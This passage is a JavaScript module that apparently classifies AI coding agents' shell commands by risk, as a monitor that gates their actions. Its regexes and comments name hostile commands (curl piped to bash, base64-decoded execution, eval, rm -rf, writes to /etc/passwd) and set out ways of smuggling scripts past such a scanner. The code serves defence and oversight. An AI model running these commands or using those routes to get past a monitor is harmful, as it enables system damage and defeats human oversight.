/*
 * Structured session reading — the deeper, higher-fidelity layer under
 * `watch --agent` and the PreToolUse hook's trajectory reconstruction.
 *
 * The wrap parser reads TEXT out of a terminal and guesses. This module reads the
 * STRUCTURE the agent already emits in its session log:
 *
 *   - Claude Code : each line carries content blocks — `tool_use` {name, input}
 *     paired with `tool_result` {content, is_error, tool_use_id}. We pair them by
 *     id across lines (stateful), so we know EXACTLY which tool ran, on what
 *     input (real file paths, real commands), and its REAL result (is_error /
 *     parsed exit) — not a regex guess. Assistant `text` blocks are read only for
 *     completion claims.
 *   - Codex / CodeBuddy : schemas vary and evolve, so we do a light structured
 *     extraction (command + exit_code from known field names) and fall back to
 *     the text heuristic when the shape is unfamiliar. Never a regression, often
 *     an upgrade. (Field names to be confirmed against real logs before GA.)
 *
 * This is also the canonical home of classifyToolCall (used by the hook) and the
 * heuristic transcript reader, so the hook and the watchers share one classifier.
 */

import { closeSync, existsSync, openSync, readdirSync, readFileSync, readSync, statSync } from "node:fs";
import { operatorTurnFromLine, boundaryFromLine, pushBoundary } from "./outsider-mandate.js";
import { deltaOf } from "./outsider-ratchet.js";
import { parseLine } from "./outsider-wrap.js";

/* ------------------------------------------------------------------ *
 * tool-call classification (shared with the PreToolUse hook)
 * ------------------------------------------------------------------ */

/*
 * RISK TIERS — a DEFAULT-DENY classifier, not a blocklist.
 *
 * The prior version asked "does this match a list of ~20 dangerous strings?" and
 * allowed everything else. That is default-allow: `make deploy`, `rm -fr`,
 * `psql -f wipe.sql`, `echo …|base64 -d|sh` all walked through. This version asks
 * "can I PROVE this is a safe read (or a reversible local build)?" and treats
 * everything I cannot prove safe as consequential. Tiers:
 *   destructive : rm/dd/shred, DROP/TRUNCATE/DELETE, prune/volume rm, k8s delete,
 *                 terraform destroy, cloud delete/terminate, overwrite of a system
 *                 path, payments — ALWAYS needs a human (never auto-allowed).
 *   deploy      : deploy/ship/publish/apply/push-to-release/migrate — allowed only
 *                 when the acceptance test is CURRENTLY green.
 *   safe        : read-only (ls/cat/grep/find-without-delete/git status/test runs).
 *   build       : reversible local dev (build/lint/format/install/mkdir/git commit).
 *   unknown     : anything else — NOT proven safe → gated outside an explicit sandbox.
 */
const DESTRUCTIVE = /(\brm\s+-\w*[rf]|\brm\s+--(?:recursive|force)|\bdd\s+if=|\bshred\b|\bmkfs|\bchmod\s+-R\s+0{3}\b|\bdrop\s+(?:table|database|schema)\b|\btruncate\b|\bdelete\s+from\b|\bdocker\s+(?:system\s+prune|volume\s+rm)|\bkubectl\s+delete\b|\bterraform\s+destroy\b|\bhelm\s+uninstall\b|\b(?:aws|az|gcloud)\b[^\n]*\b(?:delete|terminate|destroy|rm)\b|\bstripe\b|api\.stripe\.com|\b(?:charge|refund|payout|wire\s+transfer)\b)/i;

/*
 * REDIRECT OVERWRITE of a system path.
 *
 * The prior pattern was `>\s*\/(?:etc|dev|boot|usr|bin|sys|var)\b`, which reads
 * `2>/dev/null` as destroying a device node. On a real 243-step session that one
 * character class denied 18 steps, every one of them a read-only grep or ls. A
 * supervisor that stops `grep -rn foo src 2>/dev/null` is uninstalled within the
 * hour, and correctly so.
 *
 * Two guards: the fd-number/`&` prefix is excluded (`2>`, `&>` are stream
 * plumbing, not paths), and the four sinks that ARE the plumbing are named.
 */
const SYS_REDIRECT = /(?:^|[^0-9&\d])>>?\s*\/(?:etc|boot|usr|bin|sbin|sys|lib)\b|>>?\s*\/dev\/(?!null\b|stdout\b|stderr\b|tty\b)\w+/i;

/* remote or decoded code piped straight into a shell — provably arbitrary
 * execution from a source the operator cannot read before it runs */
const REMOTE_EXEC = /\b(?:curl|wget|fetch)\b[^\n]*\|\s*(?:sudo\s+)?(?:sh|bash|zsh|dash|python3?|perl|ruby|node)\b|\bbase64\s+(?:-d|-D|--decode)\b[^\n]*\|\s*(?:sudo\s+)?(?:sh|bash|zsh|dash|python3?|node)\b/i;
/*
 * `eval` — the command text does not disclose what will execute. That IS a
 * proof, of a negative, and it is the one thing a supervisor can say about an
 * opaque command that the host's unknown-command prompt cannot. Kept at the
 * always-stop tier for the same reason base64|sh is.
 *
 * A bare `cat x | bash` is deliberately NOT here: the operator can read x, the
 * same way they can read the file behind `bash x`, which defers. Remote and
 * decoded sources are the ones nobody can read before they run.
 */
/*
 * `eval` IN COMMAND POSITION — not the English word.
 *
 * `/\beval\s/` matched a JavaScript comment's closing words — "…as the
 * trajectory eval" followed by the comment terminator — inside a file being
 * written by heredoc.
 * being written to a file. A verb is a verb because of where it stands: at the
 * start of a command, or right after a separator, `then`, `do`, `else`, or a
 * subshell open. Anywhere else it is a noun.
 */
const OPAQUE_EXEC = /(?:^|[;&|(]\s*|\b(?:then|do|else|;)\s+)(?:sudo\s+)?eval\s/i;

/* `find … -exec <cmd>` and `find … -delete`: the risk is the INNER command, so
 * classify that instead of pattern-matching `-exec rm` and calling it done.
 * `-exec sed -i`, `-exec chmod 000`, `-exec unlink` all walked through before. */
const FIND_DELETE = /\bfind\b[\s\S]*\s-delete\b/i;
const FIND_EXEC = /\bfind\b[\s\S]*?\s-(?:exec|execdir|ok)\s+([\s\S]*?)(?:\s+\\?;|\s+\+|$)/i;
const MUTATES = /^\s*(?:sudo\s+)?(?:rm|shred|dd|mv|unlink|truncate|chmod|chown|chgrp|ln|install|tee|sed\s+-i)\b/i;

/* writing INTO a system path — `cp evil /usr/bin/ls`, `cp payload /etc/cron.d/x`.
 * Reading OUT of one is ordinary, so for cp/mv/ln/install only the destination
 * (the last non-flag token) is tested. */
const PATH_WRITER = /^\s*(?:sudo\s+)?(cp|mv|ln|install|tee|touch|chmod|chown|chgrp)\b/i;
const DEST_ONLY = new Set(["cp", "mv", "ln", "install"]);
const SYSTEM_PATH = /^\/(?:etc|usr|bin|sbin|boot|sys|lib|lib64|var\/(?:lib|spool)|System|Library\/LaunchDaemons|Library\/LaunchAgents)(?:\/|$)/i;

/*
 * SELF-PRESERVATION EXEMPTION.
 *
 * `rm -f ~/.claude/settings.json` matched DESTRUCTIVE, so once installed the
 * supervisor denied its own uninstall. Good at first, then degrades, then cannot
 * be removed is the worst failure curve a tool can have, and it is the one the
 * operator remembers. Removing Outsider is always the operator's call.
 */
const UNINSTALL_TARGET = /(?:\.claude\/settings(?:\.local)?\.json|\.codex\/(?:hooks\.json|config\.toml)|\.codebuddy\/settings\.json|claude_desktop_config\.json|dist-plugin|outsider-install|outsider-hook|outsider-guard|\bOutsider\/install\.mjs)/i;
const DEPLOY = /\b(?:deploy|ship\s+it|release|docker\s+push|kubectl\s+apply|helm\s+(?:install|upgrade)|terraform\s+apply|pulumi\s+up|serverless\s+deploy|vercel\b[^\n]*--prod|netlify\s+deploy|(?:npm|yarn|pnpm)\s+publish|gh\s+pr\s+merge|--force-with-lease|\bmigrat(?:e|ion)\b|flyway|liquibase|alembic\s+upgrade)/i;
const SAFE_READ = /^\s*(?:sudo\s+)?(?:ls|ll|cat|bat|less|more|head|tail|nl|wc|grep|rg|ag|find|fd|tree|pwd|whoami|id|which|type|echo|printf|date|uname|hostname|df|du|stat|file|diff|cmp|sort|uniq|cut|column|jq|yq|basename|dirname|realpath|readlink|md5sum|sha256sum|shasum|env|printenv|ps|lsof|ss|netstat|sleep|true|test|awk|sed\s+-n|pytest|py\.test|tox|go\s+test|cargo\s+test|npm\s+(?:run\s+)?test|yarn\s+test|pnpm\s+test|jest|mocha|rspec|phpunit|python\s+-m\s+unittest|node\s+(?:-v|--version)|npm\s+(?:-v|--version)|python3?\s+(?:-V|--version)|pip\s+(?:list|show|freeze)|npm\s+ls|docker\s+(?:ps|images|logs|inspect|compose\s+(?:ps|logs|config))|kubectl\s+(?:get|describe|logs|explain)|git\s+(?:status|diff|log|show|branch|remote|blame|describe|rev-parse|ls-files|config\s+--get))\b/i;
const BUILD_SAFE = /^\s*(?:make(?!\s+(?:deploy|release|publish|prod|migrate|push))|go\s+build|go\s+vet|cargo\s+build|cargo\s+check|(?:npm|yarn|pnpm)\s+run\s+(?:build|lint|format|typecheck|tsc)|tsc\b|eslint|prettier|black|ruff|isort|gofmt|mkdir|touch|cp\b|git\s+add|git\s+commit|git\s+checkout|git\s+stash|git\s+restore|pip\s+install|(?:npm|yarn|pnpm)\s+(?:install|ci|add)|poetry\s+install)\b/i;
const TEST_CMD = /\b(pytest|py\.test|tox|npm\s+(?:run\s+)?test|yarn\s+test|go\s+test|cargo\s+test|jest|mocha|rspec|phpunit|python\s+-m\s+unittest)\b/i;
const SUBMIT_CMD = /\b(git\s+commit|git\s+push|gh\s+pr\s+create|create[_-]?pr|submit|finish|complete[_-]?task|mark\s+(?:as\s+)?done)\b/i;
const EDIT_TOOLS = new Set(["Write", "Edit", "MultiEdit", "str_replace", "str_replace_editor",
  "str_replace_based_edit_tool", "apply_patch", "create_file", "NotebookEdit"]);
const SENSITIVE_PATH = /\/(?:etc|prod|production|secrets?)\/|\.env(?:\.|$)|\/\.ssh\/|id_rsa|credentials/i;

/* running a script/query through a DB client — the mutation is in the file, so
 * treat as deploy-tier (gate until tested) rather than trusting the command text */
const DB_EXEC = /\b(?:psql|mysql|mariadb|mongo|mongosh|sqlite3|redis-cli|clickhouse-client)\b[^\n]*(?:\s-f\b|\s-c\b|--file|--eval|<\s*\S)/i;

/*
 * SEGMENTATION — a real agent almost never issues a bare command. It issues
 * `cd /repo && grep -n foo .`. Anchoring SAFE_READ at `^` therefore read the
 * whole thing as `cd`, failed to prove it safe, and gated it. Measured on a
 * 91-command corpus of ordinary session traffic, 42.6% of calls the operator
 * wanted were interrupted. That is not a supervisor, that is a wall with a
 * logo on it.
 *
 * Splitting on the shell's own sequencing operators and taking the WORST tier
 * is simultaneously WIDER (`cd && grep` now reads safe) and STRICTER (the old
 * anchor read `ls && rm -rf /` as safe, because it only ever saw `ls`).
 *
 * Quote- and escape-aware on purpose: `find … -exec rm {} \;` must not split at
 * the escaped semicolon, and `echo "a && b"` must not split at all. Heredoc
 * bodies are data, not commands — a lesson from a real session where heredoc
 * content was parsed as a failing test that never ran.
 */
const GLUE = /^\s*(?:cd|export|unset|set|pushd|popd|umask|alias|nvm\s+use|conda\s+activate|pyenv\s+(?:local|shell)|[A-Z_][A-Z0-9_]*=)/;

export function segmentsOf(cmd) {
  let src = String(cmd ?? "");
  const heredoc = src.match(/<<-?\s*['"]?(\w+)/);       // body after this is data
  if (heredoc) src = src.slice(0, heredoc.index);
  const out = [];
  let buf = "", quote = null;
  for (let i = 0; i < src.length; i++) {
    const c = src[i];
    if (quote) {
      buf += c;
      if (c === "\\" && quote !== "'") buf += src[++i] ?? "";
      else if (c === quote) quote = null;
      continue;
    }
    if (c === "'" || c === '"') { quote = c; buf += c; continue; }
    if (c === "\\") { buf += c + (src[++i] ?? ""); continue; }   // `\;` stays put
    if (c === "\n" || c === ";") { out.push(buf); buf = ""; continue; }
    if ((c === "&" || c === "|") && src[i + 1] === c) { out.push(buf); buf = ""; i++; continue; }
    if (c === "|") { out.push(buf); buf = ""; continue; }
    buf += c;
  }
  out.push(buf);
  return out.map((s) => s.trim()).filter(Boolean);
}

/* does this segment write into a system path? for cp/mv/ln/install only the
   destination counts — reading out of /usr/share is ordinary work */
function writesSystemPath(seg) {
  const m = seg.match(PATH_WRITER);
  if (!m) return false;
  const verb = m[1].toLowerCase();
  const args = seg.split(/\s+/).slice(1).filter((t) => t && !t.startsWith("-"));
  const targets = DEST_ONLY.has(verb) ? args.slice(-1) : args;
  return targets.some((t) => SYSTEM_PATH.test(t.replace(/^['"]|['"]$/g, "")));
}

const TIER_ORDER = { safe: 0, build: 1, unknown: 2, deploy: 3, destructive: 4 };
const worst = (a, b) => (TIER_ORDER[b] > TIER_ORDER[a] ? b : a);

/*
 * `git push` is two different actions wearing one name. Pushing a named feature
 * branch is reversible work. Pushing bare (the upstream is whatever the branch
 * tracks, and nobody reading the command can tell), force-pushing, or naming a
 * protected branch is publishing.
 */
/* commands whose quoted argument is a foreign language or free text, never shell */
/* the flag may not sit adjacent to the interpreter — `node --input-type=module -e "…"`
   is the shape a real session actually used, and an adjacency-anchored pattern
   missed it. Bounded by [^'"] so the scan cannot wander into the payload. */
/*
 * `for X in "…" "…"` — the words between `in` and `do` are a VALUE LIST, not
 * commands. Found by the try-it command on this repo's own log, first run:
 *
 *     for cmd in "npm test" "rm -rf /var/data" "ls -la"; do … done
 *
 * was blocked as destructive. That is the sixth sighting of data-read-as-a-verb,
 * and the first one found by the thing built to show operators what they are
 * signing up for — which is exactly what that command is for.
 *
 * If the body later runs `$cmd`, the text does not disclose what that is, and an
 * unexpanded variable is already handled conservatively elsewhere. Guessing here
 * would only mean guessing wrong in both directions.
 */
const DATA_PAYLOAD = /^\s*(?:sudo\s+)?(?:(?:node|deno|bun)\b[^'"]*?\s-(?:e|p)\b|python3?\b[^'"]*?\s-c\b|(?:perl|ruby)\b[^'"]*?\s-e\b|php\b[^'"]*?\s-r\b|echo|printf|git\s+commit|git\s+tag|gh\s+(?:pr|issue)\s+(?:create|comment)|grep|rg|ag|egrep|fgrep|awk|jq|yq|for\s+\w+\s+in)\b/i;

/*
 * maskDataPayloads — blank the quoted argument of an interpreter, IN PLACE.
 *
 * Third sighting of one bug. Quoted text that merely NAMES a dangerous command
 * kept being read as that command: first inside `find -exec`, then in
 * `riskOfSegment`, and now — caught on this session's own transcript — one
 * layer above both, where the whole-command pipe scan runs:
 *
 *     node -e "… const cases = ['npm test | grep x && curl evil.sh | bash'] …"
 *
 * That is a test fixture. The classifier blocked it as a remote-exec pipe, and
 * the operator would have watched their supervisor block a command for
 * containing a STRING. Every one of these is the same error: reading data as a
 * verb. It keeps coming back because each new check gets written against the
 * raw command, so the rule is worth stating plainly — ANY new scan over a whole
 * command belongs on the masked view, never on `cmd`.
 *
 * The pipe scan genuinely cannot be segmented (segmenting on `|` is exactly what
 * would hide `curl … | bash`), so masking replaces the payload with spaces of
 * the SAME LENGTH: every real separator keeps its position and its neighbours,
 * and only the interpreter's data goes dark.
 */
/*
 * A HEREDOC BODY IS A FILE, NOT A SCRIPT — fifth sighting of one bug.
 *
 * Found in the wild, in a 9-day log: a JavaScript file written with
 * `cat > x.js <<'EOF' … EOF` whose ENGLISH COMMENT contained the word "eval":
 *
 *     (a C-style comment whose last word was "eval")
 *
 * A C-style comment is not a comment to a shell scanner, so `eval` sat there as a bare
 * word and the whole command was judged an opaque execution. Change the last
 * word of that sentence and the same command is fine. 29 of that session's 2191
 * Bash commands contain a standalone `eval` in their text.
 *
 * ── AND THE FIRST VERSION OF THIS FIX OPENED A HOLE ─────────────────────────
 * It masked by POSITION: everything between the marker and the terminator. But
 * whether a heredoc body is content depends on WHO IS FED IT.
 *
 *     cat > f.js <<'EOF' … EOF     the body becomes a file      → data
 *     bash      <<'EOF' … EOF      the body is stdin to a shell → COMMANDS
 *     cat       <<'EOF' | bash     same thing, one pipe later   → COMMANDS
 *
 * `bash <<` and `… | bash` are the classic way to smuggle a script past a
 * scanner, and the first version waved both through. Found by an adversarial
 * pass on my own relaxation — which I had not run and should have.
 *
 * The rule is the mirror of V76's: A HEREDOC BODY IS DATA ONLY WHEN THE THING
 * RECEIVING IT IS NOT A SHELL. A non-shell interpreter (python3 <<EOF) still
 * masks, because Python source is not shell either way.
 *
 * V76 fixed the tool layer — "a payload is a shell command only when the tool is
 * a shell". `Bash` IS a shell, so its heredoc body was still scanned. The rule
 * generalises one level down: WITHIN a shell command, the bytes between a
 * heredoc marker and its terminator are content being written, not commands
 * being run. Masked with same-length spaces so every separator outside keeps its
 * position, exactly as for quoted payloads.
 */
/*
 * IS THIS A SHELL? — asked after stripping the wrappers, not of the first word.
 *
 * First-word string matching missed eight spellings of the same shell:
 *
 *     /bin/bash   /usr/bin/bash   env bash   /usr/bin/env bash
 *     command bash   exec bash   nohup bash   timeout 5 bash
 *
 * `env bash <<EOF` came out `safe` — more confident than `unknown`, which is the
 * worst possible reading. And the same root made `cat <<EOF | bash` a block while
 * `echo … | bash` walked, because only one of them started with `cat`.
 *
 * One normaliser, used everywhere the question "is this a shell" is asked: peel
 * the transparent wrappers, take the basename, and treat an unexpanded variable
 * as unknowable rather than harmless.
 */
const WRAPPERS = /^\s*(?:\S*\/)?(?:sudo(?:\s+-\w+)*|env(?:\s+[A-Za-z_]\w*=\S*)*|command|exec|nohup|stdbuf\s+\S+|nice(?:\s+-n\s+-?\d+)?|time|timeout\s+(?:-k\s+\S+\s+)?-?\S+)\s+/i;
const SHELL_BASENAMES = new Set(["sh", "bash", "zsh", "dash", "ksh", "ash", "busybox"]);

export function shellHead(text) {
  let t = String(text ?? "").trim();
  for (let i = 0; i < 5 && WRAPPERS.test(t); i++) t = t.replace(WRAPPERS, "");
  const first = t.split(/\s+/)[0] ?? "";
  if (!first) return null;
  /* an unexpanded variable could be anything, so it is never "not a shell" */
  if (/^\$\{?\w/.test(first)) return "unknown-var";
  return first.replace(/^.*\//, "").toLowerCase();
}

export function isShellInvocation(text) {
  const h = shellHead(text);
  if (!h) return false;
  if (h === "unknown-var") return true;                  // fail closed
  if (SHELL_BASENAMES.has(h)) return true;
  /* `source /dev/stdin` and `. /dev/stdin` read stdin as script */
  return /^(?:source|\.)$/.test(h) && /\/dev\/stdin\b/.test(String(text));
}

/* a shell as the command the heredoc feeds, or anywhere in its pipeline */
function SHELL_RECIPIENT_TEST(line) {
  for (const part of String(line ?? "").split(/\|+/)) {
    if (isShellInvocation(part)) return true;
  }
  return false;
}
const SHELL_RECIPIENT = { test: SHELL_RECIPIENT_TEST };

/*
 * The bodies a SHELL is fed. Not masking them was only half the fix: an unmasked
 * body still sits inside one segment whose head is `bash`, so nothing ever
 * classified it and `bash <<'EOF' rm -rf / EOF` came out "unknown". A script fed
 * to a shell has to be READ AS A SCRIPT — the same recursion `bash -c '…'`
 * already gets.
 */
export function shellHeredocBodies(cmd) {
  const src = String(cmd ?? "");
  const re = /<<-?\s*(?:(['"])([A-Za-z_][\w-]*)\1|([A-Za-z_][\w-]*))/g;
  const out = [];
  let m;
  while ((m = re.exec(src)) !== null) {
    if (src[m.index + 2] === "<") continue;
    const delim = m[2] ?? m[3];
    const bodyStart = src.indexOf("\n", m.index + m[0].length);
    if (bodyStart < 0) continue;
    const lineStart = src.lastIndexOf("\n", m.index) + 1;
    if (!SHELL_RECIPIENT.test(src.slice(lineStart, bodyStart))) continue;
    const endRe = new RegExp(`^[ \\t]*${delim.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}[ \\t]*$`, "m");
    const rest = src.slice(bodyStart + 1);
    const found = endRe.exec(rest);
    out.push(rest.slice(0, found ? found.index : rest.length));
    re.lastIndex = found ? bodyStart + 1 + found.index : src.length;
  }
  return out;
}

/*
 * The text a pipeline feeds into a shell. Only the quoted/echoed payload is
 * extracted — if the left side is a program whose output we cannot read, there
 * is nothing to classify and REMOTE_EXEC already covers the dangerous sources.
 */
export function pipedIntoShell(cmd) {
  const src = String(cmd ?? "");
  const out = [];
  const parts = src.split(/\|(?!\|)/);
  for (let i = 1; i < parts.length; i++) {
    if (!isShellInvocation(parts[i])) continue;
    const left = parts[i - 1];
    /* `echo "…"` / `printf '…'` — the payload is right there in the text */
    const q = /\b(?:echo|printf)\b[^\n]*?(['"])([\s\S]*?)\1/.exec(left);
    if (q) out.push(q[2]);
  }
  return out;
}

export function maskHeredocs(cmd) {
  const src = String(cmd ?? "");
  /* `<<`, `<<-`, optionally quoted delimiter; `<<<` is a here-STRING, not a doc */
  const re = /<<-?\s*(?:(['"])([A-Za-z_][\w-]*)\1|([A-Za-z_][\w-]*))/g;
  let out = "", last = 0, m;
  while ((m = re.exec(src)) !== null) {
    if (src[m.index + 2] === "<") continue;              // `<<<` here-string
    const delim = m[2] ?? m[3];
    const bodyStart = src.indexOf("\n", m.index + m[0].length);
    if (bodyStart < 0) continue;                          // no body on this line
    /* WHO GETS THE BODY. The command line the marker sits on: what runs before
       it, and what the whole line pipes into afterwards. A shell on either side
       means the body is a script, and a script must be read. */
    const lineStart = src.lastIndexOf("\n", m.index) + 1;
    const line = src.slice(lineStart, bodyStart);
    if (SHELL_RECIPIENT.test(line)) continue;
    /* the terminator is the delimiter alone on its own line (leading whitespace
       allowed, because `<<-` strips tabs) */
    const endRe = new RegExp(`^[ \\t]*${delim.replace(/[.*+?^${}()|[\\]\\\\]/g, "\\\\$&")}[ \\t]*$`, "m");
    const rest = src.slice(bodyStart + 1);
    const found = endRe.exec(rest);
    const bodyEnd = found ? bodyStart + 1 + found.index : src.length;
    out += src.slice(last, bodyStart + 1);
    out += src.slice(bodyStart + 1, bodyEnd).replace(/[^\n]/g, " ");
    last = bodyEnd;
    re.lastIndex = bodyEnd;
  }
  return out + src.slice(last);
}

export function maskDataPayloads(cmd) {
  const src = String(cmd ?? "");
  let out = "", segStart = 0, i = 0;
  while (i < src.length) {
    const c = src[i];
    if (c === "\\") { out += src.slice(i, i + 2); i += 2; continue; }
    if (c === "'" || c === '"') {
      /* the head of the segment this quote belongs to decides whether the
         quoted run is data or shell */
      const head = src.slice(segStart, i);
      let j = i + 1;
      while (j < src.length) {
        if (src[j] === "\\" && c !== "'") { j += 2; continue; }
        if (src[j] === c) break;
        j += 1;
      }
      const end = j < src.length ? j : src.length - 1;
      const run = src.slice(i, end + 1);
      out += DATA_PAYLOAD.test(head) ? " ".repeat(run.length) : run;
      i = end + 1;
      continue;
    }
    if (c === "|" || c === "&" || c === ";") {
      out += c; i += 1;
      /* a separator ends the segment; `|` in `||` still ends it, so advancing
         one char at a time is correct here */
      segStart = i;
      continue;
    }
    out += c; i += 1;
  }
  return out;
}

/*
 * createdInRun — every path this run has made, read off its own trajectory.
 *
 * THE THING A PERMISSION PROMPT CANNOT DO. A host's confirmation dialog sees one
 * command with no history, so `rm -f fixtures/v41-cm1/*.pt` is just a delete. The
 * supervisor has the run: if THIS session generated that fixture forty steps ago,
 * removing it is the agent undoing its own work, and no operator wants to be
 * woken for that.
 *
 * Nine of a stranger's fourteen remaining blocks are this shape — delete an
 * artifact this run produced, then regenerate it. Last round I refused to solve
 * it by reading `npm run v39:seal` and guessing what it regenerates, because
 * guessing from a name is exactly the shape of the `mkdir` hole. This is the
 * same problem answered with evidence instead: not "that script probably makes
 * it", but "this run demonstrably did".
 *
 * Creation only — a path merely READ is not created, and a path that existed
 * before the run began is not in here at all.
 */
/* creators whose NEW path is the first argument */
const CREATORS = /(?:^|[;&|]\s*)(?:sudo\s+)?(?:mkdir(?:\s+-p)?|touch|tee|unzip[^\n]*?-d|tar[^\n]*?-C|curl[^\n]*?-[oO]|wget[^\n]*?-O)\s+([^\s;&|]+)/g;
/*
 * …and the ones whose new path is the LAST argument. `cp /tmp/x ./x` creates
 * `./x`, not `/tmp/x` — reading the first token here recorded the SOURCE as the
 * created file, so `rm -f ./sem-validate.mjs` stayed blocked even though this
 * run had just copied that file into place. Same first-argument reflex that made
 * `cp evil /usr/bin/ls` need a destination-only rule three rounds ago.
 */
const DEST_LAST = /^\s*(?:sudo\s+)?(?:cp|mv|install|rsync|ln)\b([\s\S]*)$/i;
const CLONE_LAST = /^\s*(?:sudo\s+)?git\s+clone\b([\s\S]*)$/i;
const REDIRECT_TO = /(?:^|[^0-9&<])>{1,2}\s*([^\s;&|]+)/g;

/*
 * 规范化 —— 台账存的必须是路径，不是字符串。
 *
 * An external attack pass walked through five ways of writing the same
 * directory: a trailing slash, quotes, a relative `cd` (the ledger recorded
 * `data` while the deletion said `/var/data`), a `..` escape, and an unexpanded
 * variable matching another unexpanded variable. `/var/./data` and `/var/DATA`
 * were refused only because the strings happened to differ — the rule was not
 * doing the work, luck was.
 *
 * Same defect I fixed on the DECIDING side three rounds ago (`cd` tracking) and
 * never carried across to the LEDGER side. A path comparison written as a string
 * comparison will keep producing exactly this list.
 */
export function normPathAbs(p, cwdHint = null) {
  let v = String(p ?? "").trim().replace(/^(['"])([\s\S]*)\1$/, "$2");
  if (!v || v.startsWith("-")) return null;
  /* an unexpanded variable is not a path — it is a hole. Two of them being the
     same TEXT never means they are the same place. */
  if (/\$\{?\w/.test(v)) return null;
  if (v.startsWith("~")) return null;                    // home is never ledgered
  if (!v.startsWith("/")) {
    if (!cwdHint || !cwdHint.startsWith("/")) return null;   // unknowable, so unclaimed
    v = `${cwdHint === "/" ? "" : cwdHint.replace(/\/+$/, "")}/${v}`;
  }
  const out = [];
  for (const seg of v.split("/")) {
    if (!seg || seg === ".") continue;
    if (seg === "..") { if (!out.length) return null; out.pop(); continue; }
    out.push(seg);
  }
  return `/${out.join("/")}`;
}

/*
 * 创建不是所有权。
 *
 * `echo x > /etc/passwd` then `rm -f /etc/passwd` was ALLOWED: writing to a path
 * had become a permit to delete it. The secret list stopped `~/.ssh` and did
 * nothing for `/etc/passwd` or `/usr/bin/ls`, which are the same kind of thing —
 * and no list is ever long enough, because the attacker picks the name.
 *
 * The rule is not "which names are precious", it is that CREATING SOMETHING IN A
 * PLACE YOU DO NOT OWN DOES NOT MAKE IT YOURS. A run may claim what it made
 * under a scratch root or under the repo it is working in. Nothing else.
 */
const OWNABLE_ROOT = /^\/(?:tmp|var\/tmp|private\/tmp)(?:\/|$)/;

export function createdInRun(steps = [], { cwd = null } = {}) {
  const made = new Set();
  const add = (p, hint) => {
    const v = normPathAbs(p, hint);
    if (!v || v === "/") return;
    if (NEVER_EPHEMERAL.test(v)) return;
    if (SYSTEM_ROOT.test(v)) return;                     // creation ≠ ownership
    /* ownable: a scratch root, or inside the directory the run is working in */
    const base = cwd && cwd.startsWith("/") ? cwd.replace(/\/+$/, "") : null;
    const inRepo = base && (v === base || v.startsWith(`${base}/`));
    if (!OWNABLE_ROOT.test(v) && !inRepo) return;
    made.add(v);
  };
  let hint = cwd && String(cwd).startsWith("/") ? String(cwd).replace(/\/+$/, "") : null;
  for (const s of steps) {
    if (s.isEdit && s.file) add(s.file, hint);
    const cmd = String(s.cmd ?? s.action ?? "");
    if (!cmd || s.actionKind !== "shell") continue;
    const scan = maskDataPayloads(maskHeredocs(cmd));
    /* the same `cd` tracking the decision side already does, so a relative
       creation is ledgered as the place it actually made */
    let local = hint;
    for (const seg of segmentsOf(scan)) {
      const cd = /^\s*cd\s+(?:--\s+)?(['"]?)([^'"]+)\1\s*$/.exec(seg);
      if (cd) {
        const to = cd[2].trim();
        if (to.includes("..") || to.startsWith("~")) { local = null; continue; }
        if (to.startsWith("/")) local = to === "/" ? "/" : to.replace(/\/+$/, "");
        else if (local) local = `${local === "/" ? "" : local}/${to.replace(/\/+$/, "")}`;
        else local = null;
        continue;
      }
      for (const m of seg.matchAll(CREATORS)) add(m[1], local);
      for (const m of seg.matchAll(REDIRECT_TO)) add(m[1], local);
      const dl = DEST_LAST.exec(seg) ?? CLONE_LAST.exec(seg);
      if (dl) {
        const toks = dl[1].split(/\s+/).filter((t) => t && !t.startsWith("-"));
        if (toks.length >= 2) add(toks[toks.length - 1], local);
      }
    }
  }
  return made;
}

/* did this run make this exact path, or something that contains it? */
export function wasCreatedInRun(target, made, { cwd = null } = {}) {
  if (!made || !made.size) return false;
  const raw = String(target ?? "").trim();
  if (!raw || NEVER_EPHEMERAL.test(raw)) return false;

  /*
   * A glob is judged by the directory it sits in — `fixtures/x/*.pt` counts if
   * this run created `fixtures/x`. The wildcard is replaced before normalising
   * so `..` inside a glob cannot sneak through the path walk.
   */
  const star = raw.indexOf("*");
  const probeRaw = star >= 0
    ? (raw.lastIndexOf("/", star) > 0 ? raw.slice(0, raw.lastIndexOf("/", star)) : null)
    : raw;
  if (!probeRaw) return false;

  /*
   * NORMALISED ON BOTH SIDES, OR IT IS A STRING COMPARISON AGAIN. Five spellings
   * of one directory walked through the previous version: trailing slash,
   * quotes, a relative `cd`, a `..` escape, and an unexpanded variable matching
   * another unexpanded variable. `normPathAbs` returns null for anything it
   * cannot place — an unexpanded variable, a `..` above the root, a relative
   * path with no known cwd — and null is refused, never guessed.
   */
  const probe = normPathAbs(probeRaw, cwd);
  if (!probe || probe === "/") return false;
  if (NEVER_EPHEMERAL.test(probe) || SYSTEM_ROOT.test(probe)) return false;

  for (const p of made) {
    if (p === probe) return true;
    /* the run created a directory; this deletes something inside it */
    if (probe.startsWith(`${p}/`)) return true;
  }
  return false;
}

/*
 * explainRisk — WHY, from the classifier itself.
 *
 * The replay display used to find the culprit by re-classifying each segment and
 * looking for a destructive one. That covers the `rm` path and nothing else, so
 * five of a stranger's twenty-four blocks printed no reason at all — and those
 * five were exactly the ones he then spent a round trying to explain, reaching a
 * wrong conclusion by bisecting a command until the truncation itself became the
 * trigger. A display that explains only the easy cases is worse than one that
 * explains none, because it teaches the reader to trust it.
 *
 * So the explanation comes from the same code that decides. Whole-command rules
 * (the pipe scan) report themselves; per-segment rules report the segment.
 */
export function explainRisk(cmd, isEdit = false, path = "") {
  const tier = riskOf(String(cmd ?? ""), isEdit, path);
  if (tier !== "destructive") return { tier, rule: null, segment: null };
  const src = String(cmd ?? "");
  const scan = maskDataPayloads(maskHeredocs(src));
  const rx = (re) => { const m = re.exec(scan); return m ? m[0].trim().slice(0, 120) : null; };
  const remote = rx(REMOTE_EXEC);
  if (remote) return { tier, rule: "远程/解码内容直接进 shell", segment: remote };
  const opaque = rx(OPAQUE_EXEC);
  if (opaque) return { tier, rule: "eval —— 命令文本不披露将要执行什么", segment: opaque };
  if (isEdit && SENSITIVE_PATH.test(path)) return { tier, rule: "写敏感路径", segment: path };
  for (const seg of segmentsOf(scan)) {
    if (GLUE.test(seg)) continue;
    if (riskOfSegment(seg) !== "destructive") continue;
    /*
     * NAME THE TOKEN THAT MATCHED. "破坏性动作" as a final answer is what a
     * reviewer was handed for a `for w in <12 English words>` loop, and there was
     * no way for him to get further — the display named a category, not a cause.
     * An explanation that cannot be acted on is the same defect as no
     * explanation, one politeness removed.
